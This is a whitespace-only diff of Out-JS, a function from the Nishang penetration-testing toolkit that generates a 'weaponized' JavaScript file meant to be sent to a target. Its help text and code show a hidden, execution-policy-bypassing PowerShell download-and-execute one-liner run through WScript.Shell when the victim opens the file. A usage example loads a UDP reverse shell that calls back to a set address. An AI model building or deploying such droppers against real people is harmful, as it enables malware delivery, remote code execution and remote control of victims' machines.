@@ -5,8 +5,8 @@ function Out-JS
 Nishang script useful for creating "weaponized" JavaScript file which could be used to run PowerShell commands and scripts.
 
 .DESCRIPTION
-The script generates a JavaScript file. The JavaScript file (default name Style.js) needs to be sent to a target. 
-As soon as a target user opens the JS file, the specified payload will be executed. 
+The script generates a JavaScript file. The JavaScript file (default name Style.js) needs to be sent to a target.
+As soon as a target user opens the JS file, the specified payload will be executed.
 
 
 .PARAMETER Payload
@@ -24,7 +24,7 @@ Path to the directory where the files would be saved. Default is the current dir
 .EXAMPLE
 PS > Out-JS -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
 
-Use above when you want to use the payload which is a powershell download and execute one-liner. A file 
+Use above when you want to use the payload which is a powershell download and execute one-liner. A file
 named "Style.js" would be generated in the current directory.
 
 .EXAMPLE
@@ -45,14 +45,14 @@ Use above for executing a custom payload.
 .LINK
 http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html
 https://github.com/samratashok/nishang
-#> 
+#>
 
     [CmdletBinding()] Param(
-        
+
         [Parameter(Position = 0, Mandatory = $False)]
         [String]
         $Payload,
-        
+
         [Parameter(Position = 1, Mandatory = $False)]
         [String]
         $PayloadURL,
@@ -70,8 +70,8 @@ https://github.com/samratashok/nishang
     if($PayloadURL)
     {
         $Payload = "powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
-    }  
-    
+    }
+
     $cmd = @"
 c = "$Payload";
 r = new ActiveXObject("WScript.Shell").Run(c,0,true);
